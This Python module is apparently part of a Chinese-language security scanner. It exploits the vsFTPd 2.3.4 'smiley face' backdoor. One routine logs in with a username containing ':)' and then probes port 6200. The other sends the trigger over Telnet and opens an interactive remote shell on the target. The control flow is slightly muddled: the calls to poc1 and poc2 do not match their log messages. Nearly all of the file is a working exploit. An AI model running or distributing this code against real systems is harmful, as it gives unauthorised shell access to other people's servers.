#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from socket import *
from ftplib import FTP
from telnetlib import Telnet
from signal import signal, SIGINT
from sys import exit
import socket
from pub.com.outprint import OutPrintInfo
class FtpScan:
    def poc1(self,url):
        ftp = FTP()
        username = 'root:)' #用户名必须包含：)这两个字符
        password = 'anonymous' #密码随便啥都行
        try:
            ftp.connect(url,21,timeout=10)#使用ftp登录，设置延时10秒
            ftp.login(username,password)
            ftp.quit()
        except:
            OutPrintInfo("FTP","[b bright_red]完成登录检测[/b bright_red]")
        try:
            s = socket(AF_INET, SOCK_STREAM) #使用socket函数来检测是否有漏洞存在
            s.connect((url,6200))
            s.close()
            OutPrintInfo("FTP","[b bright_red]存在微笑漏洞[/b bright_red]")

            return True
        except:
            OutPrintInfo("FTP","没有发现笑脸漏洞！")
            return False

    def poc2(self,ip):
        def handler(signal_received, frame):
            # Handle any cleanup here
            OutPrintInfo("FTP",'Exiting...')
            exit(0)
        try:
            signal(SIGINT, handler)

            host = ip
            portFTP = 21  # if necessary edit this line

            user = "USER nergal:)"
            password = "PASS pass"

            tn = Telnet(host, portFTP)
            tn.read_until(b"(vsFTPd 2.3.4)")  # if necessary, edit this line
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"password.")  # if necessary, edit this line
            tn.write(password.encode('ascii') + b"\n")

            tn2 = Telnet(host, 6200)
            print('Success, shell opened')
            print('Send `exit` to quit shell')
            tn2.interact()
        except Exception as e:
            OutPrintInfo("FTP",e)


    def main(self,target):
        OutPrintInfo("FTP",'开始检测Ftp笑脸漏洞')
        ip = target["ip"]
        if '://' in ip:
            OutPrintInfo("FTP",'不需要协议头,尽量使用IP！！！')
            return
        OutPrintInfo("FTP",'开始尝试Poc1')
        if self.poc2(ip):
            OutPrintInfo("FTP",'开始调用Poc2进行检测并开启6200端口...')
            OutPrintInfo("FTP",'请开始nc监听6200端口')
            self.poc1(ip)
            return
        OutPrintInfo("FTP",'开始尝试Poc2')
        self.poc1(ip)
        OutPrintInfo("FTP",'Ftp笑脸漏洞检测结束')
        pass